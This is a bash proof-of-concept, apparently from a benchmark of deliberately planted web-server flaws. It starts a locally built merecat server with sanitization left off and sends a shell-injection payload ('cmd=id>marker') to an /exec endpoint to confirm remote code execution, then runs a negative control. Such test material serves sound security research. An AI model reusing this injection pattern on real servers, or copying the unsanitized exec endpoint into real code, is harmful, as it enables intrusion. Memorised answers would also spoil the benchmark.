#!/usr/bin/env bash
# PoC for 053_merecat_C3I2S3
# Axes: C3 (three CLI flags + exec_is_ready()) / I2 (buffered snprintf) / S3 (config-gated sanitization)
#
# Vulnerability: --strict-exec is omitted at startup, leaving the sanitization
# check inactive.  Without --strict-exec, shell metacharacters are not filtered.
#
# Gate flags required: --exec-mode --exec-logging --exec-init
# Exploit: omit --strict-exec so the sanitization path is never entered.
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/merecat"
WWWROOT="/tmp/poc_053_www"
MARKER="/tmp/poc_053_marker"
PORT=18053

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server (omit --strict-exec to bypass S3 sanitization) ───────────────
echo "[*] starting merecat with all three gate flags (no --strict-exec) on port $PORT..."
"$BINARY" -n -p "$PORT" "$WWWROOT" --exec-mode --exec-logging --exec-init &
SERVER_PID=$!
sleep 2

# ── trigger ────────────────────────────────────────────────────────────────────
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control: endpoint absent without all three gate flags ─────────────
echo "[*] verifying gate: endpoint must be absent without all three flags..."
NEG_PORT=$((19000 + 53))
"$BINARY" -n -p $NEG_PORT "$WWWROOT" --exec-mode --exec-logging &
SAFE_PID=$!
sleep 2
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-init"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
